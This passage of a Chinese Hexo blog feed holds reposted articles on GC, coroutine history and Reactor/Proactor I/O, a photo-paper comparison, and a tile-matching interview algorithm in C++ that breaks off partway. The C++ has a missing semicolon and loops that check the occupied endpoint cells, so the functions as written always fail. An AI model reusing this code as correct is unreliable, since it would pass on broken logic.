中那些短期对象的销毁代价转嫁到了一次性的标记清除过程。这把逻辑处理和资源管理正交分解了。这种被分解的问题，会随着硬件的进步更容易提高性能（比如多核的发展）。但是，在较小规模的软件或独立模块中，这个优势并不会太明显。反而 GC 本身远高于 RC 的复杂性，会成为其软肋。</p><p>对于不需要面向对象的软件，甚至连资源自动化管理都不需要。这时，无论是 GC 还是 RC 都无用武之地。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 转载 </tag>
            
            <tag> 垃圾回收 </tag>
            
            <tag> GC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>协程的历史，现在和未来</title>
      <link href="/hexo-blog/20160909/%E5%8D%8F%E7%A8%8B%E7%9A%84%E5%8E%86%E5%8F%B2%EF%BC%8C%E7%8E%B0%E5%9C%A8%E5%92%8C%E6%9C%AA%E6%9D%A5/"/>
      <url>/hexo-blog/20160909/%E5%8D%8F%E7%A8%8B%E7%9A%84%E5%8E%86%E5%8F%B2%EF%BC%8C%E7%8E%B0%E5%9C%A8%E5%92%8C%E6%9C%AA%E6%9D%A5/</url>
      
        <content type="html"><![CDATA[<blockquote><p>原文地址：<a href="http://blog.youxu.info/2014/12/04/coroutine/" target="_blank" rel="noopener">http://blog.youxu.info/2014/12/04/coroutine/</a></p></blockquote><p>本文原发于《程序员》2014年11月刊，发表时略有修改。</p><p>计算机科学是一门应用科学，几乎所有概念都是为了理解或解决实际问题而生的。协程 (Coroutine) 的出现也不例外。协程的概念，最早可以追溯到写作 COBOL 语言编译器中的技术难题。</p><a id="more"></a><h2 id="从磁带到协程"><a href="#从磁带到协程" class="headerlink" title="从磁带到协程"></a>从磁带到协程</h2><p>COBOL 是最早的高级语言之一。编译器则是高级语言必不可少的一部分。现如今，我们对编译器了解，已经到了可以把核心内容浓缩成一本教科书的程度。然而在六十年代，如何写作高效的语言编译器是那个时代绕不过的现实问题。比如，1960 年夏天，D. E. Knuth 就是利用开车横穿美国去加州理工读研究生的时间，对着 <a href="https://www.cs.virginia.edu/brochure/images/manuals/b205/central/central.html" target="_blank" rel="noopener">Burroughs 205</a> 机器指令集手写 COBOL 编译器。最早提出“协程”概念的 Melvin Conway 的出发点，也是如何写一个只扫描一遍程序 (one-pass) 的 COBOL 编译器。众多的“高手”纷纷投入编译器书写，可见一门新科学发展之初也是筚路蓝缕</p><p>以现代眼光来看，高级语言编译器实际上是多个步骤组合而成：词法解析，语法解析，语法树构建，以及优化和目标代码生成等等。编译实质上就是从源程序出发，依次将这些步骤的输出作为下一步的输入，最终输出目标代码。在现代计算机上实现这种管道式的架构毫无困难：只需要依次运行，中间结果存为中间文件或放入内存即可。GCC 和 Clang 编译器，以及 <a href="http://www.antlr.org/" target="_blank" rel="noopener">ANTLR</a> 构建的编译器，都遵循这样的设计。</p><p>在 Conway 的设计里，词法和语法解析不再是两个独立运行的步骤，而是交织在一起。编译器的控制流在词法和语法解析之间来回切换：当词法模块读入足够多的 token 时，控制流交给语法分析；当语法分析消化完所有 token 后，控制流交给词法分析。词法和语法分别独立维护自身的运行状态。Conway 构建的这种协同工作机制，需要参与者“让出 (yield)”控制流时，记住自身状态，以便在控制流返回时能够从上次让出的位置恢复(resume)执行。简言之，协程的全部精神就在于控制流的主动让出和恢复。我们熟悉的子过程调用可以看作在返回时让出控制流的一种特殊的协程，其内部状态在返回时被丢弃了，因此不存在“恢复”这个操作。</p><p>以现在眼光来看，编译器的实现并不必然需要协程。然而，Conway 用协程实现 COBOL 编译器在当时绝不是舍近求远。首先，从原理上来说，因为 COBOL 并不是 <a href="https://en.wikipedia.org/wiki/LL_parser" target="_blank" rel="noopener">LL(1)</a> 型语法，即使现在我们也无法简单构建一个以词法分析为子过程的自动机。其次，当年计算机依赖于磁带存储设备，而磁带存储设备只支持顺序存储（设想一下随机访问带来的频繁的倒带和快进问题）。也就是说，依次执行编译步骤并依靠中间文件通信的设计是不现实的，各步骤必须同步前进。正是这样的现实局限和设计需要，自然催生了协程的概念。</p><h2 id="自顶向下，无需协同"><a href="#自顶向下，无需协同" class="headerlink" title="自顶向下，无需协同"></a>自顶向下，无需协同</h2><p>虽然协程是伴随着高级语言诞生的，它却没有能像子过程一样成为通用编程语言的基本元素。</p><p>从 1963 年首次提出到上个世纪九十年代，我们在 ALOGL, Pascal, C, FORTRAN 等主流的命令式编程语言中都没有看到原生的协程支持。协程只稀疏地出现在 Simula，Modular-2 (Pascal 升级版) 和 Smalltalk 等相对小众的语言中。协程作为一个比子进程更加通用的概念，在实际编程却没有取代子进程，这一点不得不说是出乎意外的。如果我们结合当时的程序设计思想看，这一点又是意料之中的：协程是不符合那个时代所崇尚的“自顶向下”的程序设计思想的，自然也就不会成为当时主流的命令式编程语言 (imperative programming) 的一部分。</p><p>正如面向对象的语言是围绕面向对象的开发理念设计一样，命令式编程语言是围绕自顶向下(top-down)的开发理念设计的。在自顶向下的理念指导下，程序被切分为一个主程序和大大小小的子模块，每一个子模块又可能调用更多子模块等等。C 家族语言的 main() 函数就是这种自顶而下思想的体现。在这种理念指导下，各模块形成层次调用关系，而程序设计就是制作这些子过程。在“自顶向下”这种层次化的理念下，具有鲜明层次的子过程调用成为软件系统最自然的组织方式，也是理所当然。相较之下，具有执行中让出和恢复功能的协程在这种架构下无用武之地。可以说，自上而下的设计思想从一开始就排除了对协程的需求。其后的结构化编程(Structural Programming) 思想，更是进一步强化了“子过程调用作为唯一控制结构”的基本假设。在这样的指导思想下，协程一直没有成为当时编程语言的一等公民。</p><p>尽管从提出到上世纪 90 年代，协程在编程语言中没有普遍成为一等公民，但作为一种易于理解的控制结构，协程的概念渗入到了软件设计的许多方面。在结构化编程思想一统天下之时， D. Knuth 曾经专门写过一篇 <a href="http://c2.com/cgi/wiki?StructuredProgrammingWithGoToStatements" target="_blank" rel="noopener">“ Structured Programming with GOTO ”</a> 来为 GOTO 语句辩护。在他列出的几条 GOTO 可以方便编程且不破坏程序结构的例子中，有一个（例子7b）就是用 GOTO 实现协程控制结构。相比较之下，不用 GOTO 的“结构化”代码反而失去了良好的结构。当然，追求实际结果的工业界对于学界的这场要不要剔除 GOTO 的争论并不感冒。当时许多语言都附带了不建议使用的 GOTO 语句，显得左右逢源。这方面一个最明显的例子就是 Java：其语言本身预留了 goto 关键字，其编译器却没有提供任何的支持，可以说在 goto 这场争论中做足了中间派。</p><p>实践中，协程的思想频繁应用于任务调度和流处理上。比如，UNIX 管道就可以看成是众多命令间的协同操作。当然，管道的现代实现都是以 pipe() 系统调用和进程间的通信为基础，而非简单遵循协程的 yield/resume 语法。</p><p>许多协同式多任务操作系统，也可以看成协程运行系统。说到协同式多任务系统，一个常见的误区是认为协同式调度比抢占式调度“低级”，因为我们所熟悉的桌面操作系统，都是从协同式调度（如 Windows 3.2， Mac OS 9 等）过渡到抢占式多任务系统的。实际上，调度方式并无高下，完全取决于应用场景。抢占式系统允许操作系统剥夺进程执行权限，抢占控制流，因而天然适合服务器和图形操作系统，因为调度器可以优先保证对用户交互和网络事件的快速响应。当年 Windows 95 刚刚推出的时候，抢占式多任务就被作为一大买点大加宣传。协同式调度则等到进程时间片用完或系统调用时转移执行权限，因此适合实时或分时等等对运行时间有保障的系统。</p><p>另外，抢占式系统依赖于 CPU 的硬件支持。 因为调度器需要“剥夺”进程的执行权，就意味着调度器需要运行在比普通进程高的权限上，否则任何“流氓（rogue）”进程都可以去剥夺其他进程了。只有 CPU 支持了执行权限后，抢占式调度才成为可能。x86 系统从 80386 处理器开始引入 Ring 机制支持执行权限，这也是为何 Windows 95 和 Linux 其实只能运行在 80386 之后的 x86 处理器上的原因。而协同式多任务适用于那些没有处理器权限支持的场景，这些场景包含资源受限的嵌入式系统和实时系统。在这些系统中，程序均以协程的方式运行。调度器负责控制流的让出和恢复。通过协程的模型，无需硬件支持，我们就可以在一个“简陋”的处理器上实现一个多任务的系统。我们见到的许多智能设备，如运动手环，基于硬件限制，都是采用协同调度的架构。</p><h2 id="协程的复兴和现代形式"><a href="#协程的复兴和现代形式" class="headerlink" title="协程的复兴和现代形式"></a>协程的复兴和现代形式</h2><p>编程思想能否普及开来，很大程度上在于应用场景。协程没有能在自顶向下的世界里立足，却在动态语言世界里大放光彩，这里最显著的例子莫过于 Python 的迭代器和生成器。</p><p>回想一下在 C 的世界里，循环的标准写法是 <code>for (i = 0; i &lt; n; ++i) { … }</code>。 这行代码包含两个独立的逻辑, <code>for</code> 循环控制了 <code>i</code> 的边界条件， <code>++i</code> 控制了 <code>i</code> 的自增逻辑。这行代码适用于 C 世界里的数组即内存位移的范式，因此适合大多数访问场景。到了 STL 和复杂数据结构的世界，因为许多数据结构只支持顺序访问，循环往往写成：<code>for (i = A.first(); i.hasNext();i = i.next()) { … }</code></p><p>这种设计抽象出了一个独立于数据结构的迭代器，专门负责数据结构上元素访问顺序。迭代器把访问逻辑从数据结构上分离出来, 是一个常用的设计模式 （GoF 23个设计模式之一）.我们在 STL 和 Java Collection 中也常常看到迭代器的身影。</p><p>在适当的时候，我们可以更进一步引入一个语法糖（脚注：这里牵涉到一个外部迭代器和内部迭代器的问题。限于篇幅不在此讨论）将循环写成: <code>for i in A.Iterator() {func(i)}</code>。</p><p>事实上，许多现代语言都支持类似的语法。这种语法抛弃了以 <code>i</code> 变量作为迭代指针的功能，要求迭代器自身能够记住当前迭代位置，调用时返回下一个元素。读者不难看到，这种架构就是我们在文章开始提到的语法分析器的架构。正因为如此，我们可以从协程的角度来理解迭代器：当控制流转换到迭代器上时，迭代器负责生成和返回下一个元素。一旦下一个元素准备就绪，迭代器就让出控制流。这种特殊的迭代器实现在 Python 中又被成为生成器。以协程的角度切入的的好处是设计大大精简。实际上，在 Python 中，生成器本身就是一个普通的函数，和普通函数的唯一不同是它的返回语句是协程风格的 <code>yield</code>。这里，<code>yield</code> 一语双关，既是让出控制流，也是生成迭代器的返回值。</p><p>以上我们仅仅讨论了生成器的最基本的特性。实际上，生成器的强大之处在于我们可以像 UNIX 管道一样串联起来，组成所谓的生成器表达式。如果我们有一个可以生成 <code>1，2，3 …</code> 的生成器 <code>N</code>，则 <code>square = (i \*\*2 for i in N)</code> 就是一个生成平方数的生成器表达式。注意这里圆括号语法和 <a href="http://en.wikipedia.org/wiki/List_comprehension" target="_blank" rel="noopener">list comprehension</a> 方括号语法的区别，<code>square = [i \*\*2 for i in N]</code> 是生成一个具体的列表。我们可以串联这些生成器表达式，最终的控制流会在这些串联的部分间转换，无需我们写作复杂的嵌套调用。当然，<code>yield</code> 只是冰山的一角，现代的 Python 语言还充分利用了 <code>yield</code> 关键字构建了 <a href="https://www.python.org/dev/peps/pep-0380/" target="_blank" rel="noopener">yield from</a> 语句，<code>(yield)</code> 语法等等，使得我们无困难的将协程的思想融入到 Python 编程中去。限于篇幅这里不再展开。</p><p>我们前面说过，协程的思想本质上就是控制流的主动让出和恢复机制。在现代语言里，可以实现协程思想的方法很多，这些实现间并无高下之分，所区别的就是是否适合应用场景。理解这一点，我们对于各种协程的分类，如半对称/对称协程，有栈与无栈协程等具体实现就能提纲挈领，无需在实现细节上纠结。</p><p>协程在实践中的实现方式千差万别，一个简单的原因，是协程本身可以通过许多基本元素构建。基本元素的选取方式不一样，构建出来的协程抽象也就有差别。比如, Lua 语言选取了 <code>create</code>, <code>resume</code> 和 <code>yield</code> 作为基本构建元素, 从调度器层面构建出所谓的“非对程”协程系统。而 Julia 语言绕过调度器，通过在协程内调用 <code>yieldto</code> 函数完成了同样的功能，构建出了一个所谓的对称协程系统。尽管这两个语言使用了同样的 <code>setjmp</code> 库，构造出来的原语却不一样。又比如，许多 C 语言的协程库都使用了 <code>ucontext</code> 库实现，这是因为 POSIX 本身提供了 <code>ucontext</code> 库，不少协程实现是以 <code>ucontext</code> 为蓝本实现的。这些实现，都不可避免地带上了 <code>ucontext</code> 系统的一些基本假设，比如协程间是平等的，一般带有调度器来协调协程等等（比如 <a href="http://swtch.com/libtask/" target="_blank" rel="noopener">libtask</a> 实现，以及 <a href="http://blog.codingnow.com/2012/07/c_coroutine.html" target="_blank" rel="noopener">云风的 coroutine 库</a> ）。Go 语言的一个鲜明特色就是通道（<code>channel</code>）作为一级对象。因此，<code>resume</code> 和 <code>yield</code> 等在其他语言里的原语在 go 里都以通道方式构建。我们还可以举出许多同样的例子。这些风格的差异往往和语言的历史，演化路径，和要解决的问题相关，我们不必苛求他们的协程模型一定要如此这般。</p><p>总的来说，协程为协同任务提供了一种运行时抽象。这种抽象非常适合于协同多任务调度和数据流处理。在现代操作系统和编程语言中，因为用户态线程切换代价比内核态线程小，协程成为了一种轻量级的多任务模型。我们无法预测未来，但是可以看到，协程已经成为许多擅长数据处理的语言的一级对象。随着计算机并行性能的提升，用户态任务调度已经成为一种标准的多任务模型。在这样的大趋势下，协程这个简单且有效的模型就显得更加引人注目。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 转载 </tag>
            
            <tag> 协程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IO 设计模式：Reactor 和 Proactor 对比</title>
      <link href="/hexo-blog/20160909/IO-%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%EF%BC%9AReactor-%E5%92%8C-Proactor-%E5%AF%B9%E6%AF%94/"/>
      <url>/hexo-blog/20160909/IO-%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%EF%BC%9AReactor-%E5%92%8C-Proactor-%E5%AF%B9%E6%AF%94/</url>
      
        <content type="html"><![CDATA[<blockquote><p>原文地址：<a href="https://segmentfault.com/a/1190000002715832" target="_blank" rel="noopener">https://segmentfault.com/a/1190000002715832</a><br>Posted by: 大CC | 28APR,2015<br>博客：<a href="http://blog.me115.com/" target="_blank" rel="noopener">blog.me115.com</a> [<a href="http://feed.feedsky.com/me115" target="_blank" rel="noopener">订阅</a>]<br>微博：<a href="http://weibo.com/bigcc115" target="_blank" rel="noopener">新浪微博</a></p></blockquote><p>平时接触的开源产品如Redis、ACE，事件模型都使用的Reactor模式；而同样做事件处理的Proactor，由于操作系统的原因，相关的开源产品也少；这里学习下其模型结构，重点对比下两者的异同点；</p><h2 id="反应器Reactor"><a href="#反应器Reactor" class="headerlink" title="反应器Reactor"></a>反应器Reactor</h2><h3 id="Reactor模式结构"><a href="#Reactor模式结构" class="headerlink" title="Reactor模式结构"></a>Reactor模式结构</h3><a id="more"></a> <img src="/hexo-blog/20160909/IO-设计模式：Reactor-和-Proactor-对比/bVlyFO"><p>Reactor包含如下角色：</p><ul><li>Handle 句柄；用来标识socket连接或是打开文件；</li><li>Synchronous Event Demultiplexer：同步事件多路分解器：由操作系统内核实现的一个函数；用于阻塞等待发生在句柄集合上的一个或多个事件；（如select/epoll；）</li><li>Event Handler：事件处理接口</li><li>Concrete Event HandlerA：实现应用程序所提供的特定事件处理逻辑；</li><li>Reactor：反应器，定义一个接口，实现以下功能：<ol><li>供应用程序注册和删除关注的事件句柄；</li><li>运行事件循环；</li><li>有就绪事件到来时，分发事件到之前注册的回调函数上处理；</li></ol></li></ul><p>“反应”器名字中”反应“的由来：</p><blockquote><p>“反应”即“倒置”，“控制逆转”</p></blockquote><p>具体事件处理程序不调用反应器，而是由反应器分配一个具体事件处理程序，具体事件处理程序对某个指定的事件发生做出反应；这种控制逆转又称为“好莱坞法则”（不要调用我，让我来调用你）</p><h3 id="业务流程及时序图"><a href="#业务流程及时序图" class="headerlink" title="业务流程及时序图"></a>业务流程及时序图</h3><img src="/hexo-blog/20160909/IO-设计模式：Reactor-和-Proactor-对比/bVlyFP"><ol><li>应用启动，将关注的事件handle注册到Reactor中；</li><li>调用Reactor，进入无限事件循环，等待注册的事件到来；</li><li>事件到来，select返回，Reactor将事件分发到之前注册的回调函数中处理；</li></ol><h2 id="Proactor模式"><a href="#Proactor模式" class="headerlink" title="Proactor模式"></a>Proactor模式</h2><h3 id="Proactor模式结构"><a href="#Proactor模式结构" class="headerlink" title="Proactor模式结构"></a>Proactor模式结构</h3><img src="/hexo-blog/20160909/IO-设计模式：Reactor-和-Proactor-对比/bVlyFQ"><p>Proactor主动器模式包含如下角色</p><ul><li>Handle 句柄；用来标识socket连接或是打开文件；</li><li>Asynchronous Operation Processor：异步操作处理器；负责执行异步操作，一般由操作系统内核实现；</li><li>Asynchronous Operation：异步操作</li><li>Completion Event Queue：完成事件队列；异步操作完成的结果放到队列中等待后续使用</li><li>Proactor：主动器；为应用程序进程提供事件循环；从完成事件队列中取出异步操作的结果，分发调用相应的后续处理逻辑；</li><li>Completion Handler：完成事件接口；一般是由回调函数组成的接口；</li><li>Concrete Completion Handler：完成事件处理逻辑；实现接口定义特定的应用处理逻辑；</li></ul><h3 id="业务流程及时序图-1"><a href="#业务流程及时序图-1" class="headerlink" title="业务流程及时序图"></a>业务流程及时序图</h3><img src="/hexo-blog/20160909/IO-设计模式：Reactor-和-Proactor-对比/bVlyFR"><ol><li>应用程序启动，调用异步操作处理器提供的异步操作接口函数，调用之后应用程序和异步操作处理就独立运行；应用程序可以调用新的异步操作，而其它操作可以并发进行；</li><li>应用程序启动Proactor主动器，进行无限的事件循环，等待完成事件到来；</li><li>异步操作处理器执行异步操作，完成后将结果放入到完成事件队列；</li><li>主动器从完成事件队列中取出结果，分发到相应的完成事件回调函数处理逻辑中；</li></ol><h2 id="对比两者的区别"><a href="#对比两者的区别" class="headerlink" title="对比两者的区别"></a>对比两者的区别</h2><h3 id="主动和被动"><a href="#主动和被动" class="headerlink" title="主动和被动"></a>主动和被动</h3><p>以主动写为例：</p><ul><li>Reactor将handle放到select()，等待可写就绪，然后调用write()写入数据；写完处理后续逻辑；</li><li>Proactor调用aoi_write后立刻返回，由内核负责写操作，写完后调用相应的回调函数处理后续逻辑；</li></ul><p>可以看出，Reactor被动的等待指示事件的到来并做出反应；它有一个等待的过程，做什么都要先放入到监听事件集合中等待handler可用时再进行操作；</p><p>Proactor直接调用异步读写操作，调用完后立刻返回；</p><h3 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h3><p>Reactor实现了一个被动的事件分离和分发模型，服务等待请求事件的到来，再通过不受间断的同步处理事件，从而做出反应；</p><p>Proactor实现了一个主动的事件分离和分发模型；这种设计允许多个任务并发的执行，从而提高吞吐量；并可执行耗时长的任务（各个任务间互不影响）</p><h3 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h3><p>Reactor实现相对简单，对于耗时短的处理场景处理高效；</p><p>操作系统可以在多个事件源上等待，并且避免了多线程编程相关的性能开销和编程复杂性；</p><p>事件的串行化对应用是透明的，可以顺序的同步执行而不需要加锁；</p><p>事务分离：将与应用无关的多路分解和分配机制和与应用相关的回调函数分离开来，</p><p>Proactor性能更高，能够处理耗时长的并发场景；</p><h3 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h3><p>Reactor处理耗时长的操作会造成事件分发的阻塞，影响到后续事件的处理；</p><p>Proactor实现逻辑复杂；依赖操作系统对异步的支持，目前实现了纯异步操作的操作系统少，实现优秀的如windows IOCP，但由于其windows系统用于服务器的局限性，目前应用范围较小；而Unix/Linux系统对纯异步的支持有限，应用事件驱动的主流还是通过select/epoll来实现；</p><h3 id="适用场景"><a href="#适用场景" class="headerlink" title="适用场景"></a>适用场景</h3><p>Reactor：同时接收多个服务请求，并且依次同步的处理它们的事件驱动程序；</p><p>Proactor：异步接收和同时处理多个服务请求的事件驱动程序；</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>《面向模式的软件体系结构 卷2》<br>《面向模式的软件架构 卷4》</p>]]></content>
      
      
      
        <tags>
            
            <tag> 转载 </tag>
            
            <tag> 非阻塞 </tag>
            
            <tag> NIO </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>各种相纸比较</title>
      <link href="/hexo-blog/20151015/%E5%90%84%E7%A7%8D%E7%9B%B8%E7%BA%B8%E6%AF%94%E8%BE%83/"/>
      <url>/hexo-blog/20151015/%E5%90%84%E7%A7%8D%E7%9B%B8%E7%BA%B8%E6%AF%94%E8%BE%83/</url>
      
        <content type="html"><![CDATA[<p>最近在某宝上用不同相纸冲印了一些照片，觉得效果还是有一些差异的，现在具体对比一下，以供各位朋友日后参考，同时也作为自己的一个记录。</p><p>第一次冲洗我使用了【富士晶彩光面】、【富士金冠绒面】和【柯达皇家绒面】这三种类型的相纸。</p><a id="more"></a><p>首先介绍一下光面与绒面的区别：</p><ul><li><p>光面看起来更加鲜艳亮丽，但是容易留下指纹和划痕，因此个人认为适合风景等需要对色彩表现较高的照片。</p></li><li><p>绒面看起来柔和一些，更高档，但是有颗粒感，因此个人认为适合人像，静物等对局部细节要求较高的照片。</p></li></ul><p>其次，富士相纸和柯达相纸在色彩表现上的区别有：</p><ul><li><p>富士相纸对冷色调的表现更好，因此更适合风景等。</p></li><li><p>柯达相纸对暖色调的表现更好，因此更适合人像等。</p></li></ul><p>最后，说一下这三种相纸的区别：</p><ul><li>【富士晶彩光面】厚度最薄，但很有弹性。</li></ul><p>【富士金冠绒面】和【柯达皇家绒面】这两种虽然都是绒面，但是也有细微区别：</p><ul><li>【富士金冠绒面】的颗粒感较小，对光线的反射不太明显，厚度一般。</li><li>【柯达皇家绒面】的颗粒感较大，对光线的反射更明显，更厚一些。</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 原创 </tag>
            
            <tag> 摄影 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>连连看游戏消除算法</title>
      <link href="/hexo-blog/20150721/%E8%BF%9E%E8%BF%9E%E7%9C%8B%E6%B8%B8%E6%88%8F%E6%B6%88%E9%99%A4%E7%AE%97%E6%B3%95/"/>
      <url>/hexo-blog/20150721/%E8%BF%9E%E8%BF%9E%E7%9C%8B%E6%B8%B8%E6%88%8F%E6%B6%88%E9%99%A4%E7%AE%97%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<p>今天在收到一道的面试题，觉得比较有意思，决定记录下来，整个题目与解答过程大概如下。</p><p>连连看是一种很受大家欢迎的小游戏。下面四张图给出了最基本的消除规则：</p><a id="more"></a> <img src="/hexo-blog/20150721/连连看游戏消除算法/0.png"><p>图 A 中出现在同一直线上无障碍的圈圈可以消除；图 B 中两个圈圈可以通过一次转弯消除；图 C 和图 D 中，两个圈圈可以通过两次转弯消除。</p><p>已知以下接口，表示位置(x, y)上有无障碍物：</p><figure class="highlight cpp hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">isBlocked</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x, <span class="hljs-keyword">int</span> y)</span></span>;</span><br><span class="line"><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;       <span class="hljs-comment">// 无障碍物（位置(x,y)为空）</span></span><br><span class="line"><span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;       <span class="hljs-comment">// 有障碍物（位置(x,y)上有方块或圈圈）</span></span><br></pre></td></tr></table></figure><p>请写一个函数来判断给定的任意两个圈圈是否可消除（x1, y1与x2, y2为两个圈圈的位置）：</p><figure class="highlight cpp hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">remove</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x1, <span class="hljs-keyword">int</span> y1, <span class="hljs-keyword">int</span> x2, <span class="hljs-keyword">int</span> y2)</span></span>;</span><br></pre></td></tr></table></figure><h2 id="水平检测"><a href="#水平检测" class="headerlink" title="水平检测"></a>水平检测</h2><p>水平检测用来判断两个点的纵坐标是否相等，同时判断两点间有没有障碍物。</p><img src="/hexo-blog/20150721/连连看游戏消除算法/1.png"><p>因此直接检测两点间是否有障碍物就可以了，代码如下：</p><figure class="highlight cpp hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">bool</span> <span class="hljs-title">horizon</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x1, <span class="hljs-keyword">int</span> y1, <span class="hljs-keyword">int</span> x2, <span class="hljs-keyword">int</span> y2)</span></span></span><br><span class="line"><span class="hljs-function"></span>&#123;</span><br><span class="line">    <span class="hljs-keyword">if</span> (x1 == x2 &amp;&amp; y1 == y2)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">if</span> (x1 != x2)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">int</span> start_y = <span class="hljs-built_in">std</span>::min(y1, y2)</span><br><span class="line">    <span class="hljs-keyword">int</span> end_y = <span class="hljs-built_in">std</span>::max(y1, y2);</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = start_y; j &lt; end_y; j++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="hljs-keyword">if</span> (isBlocked(x1, j))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="垂直检测"><a href="#垂直检测" class="headerlink" title="垂直检测"></a>垂直检测</h2><p>垂直检测用来判断两个点的横坐标是否相等，同时判断两点间有没有障碍物。</p><img src="/hexo-blog/20150721/连连看游戏消除算法/2.png"><p>同样地，直接检测两点间是否有障碍物，代码如下：</p><figure class="highlight cpp hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">vertical</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x1, <span class="hljs-keyword">int</span> y1, <span class="hljs-keyword">int</span> x2, <span class="hljs-keyword">int</span> y2)</span></span></span><br><span class="line"><span class="hljs-function"></span>&#123;</span><br><span class="line">    <span class="hljs-keyword">if</span> (x1 == x2 &amp;&amp; y1 == y2)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">if</span> (y1 != y2)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">int</span> start_x = <span class="hljs-built_in">std</span>::min(x1, x2);</span><br><span class="line">    <span class="hljs-keyword">int</span> end_x = <span class="hljs-built_in">std</span>::max(x1, x2);</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = start_x; i &lt; end_x; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="hljs-keyword">if</span> (isBlocked(i, y1))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="一个拐角检测"><a href="#一个拐角检测" class="headerlink" title="一个拐角检测"></a>一个拐角检测</h2><p>一个拐角检测可分解为水平检测和垂直检测，当两个同时满足时，便两点可通过一个拐角相连。即：</p><p>一个拐角检测 = 水平检测 &amp;&amp; 垂直检测</p><img src="/hexo-blog/20150721/连连看游戏消除算法/3.png"><p>A 点至 B 点能否连接可转化为满足任意一点：</p><ol><li><p>A 点至 C 点的垂直检测，以及 C 点至 B 点的水平检测；</p></li><li><p>A 点至 D 点的水平检测，以及 D 点至 B 点的垂直检测。</p></li></ol><p>代码如下：</p><figure class="highlight cpp hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span 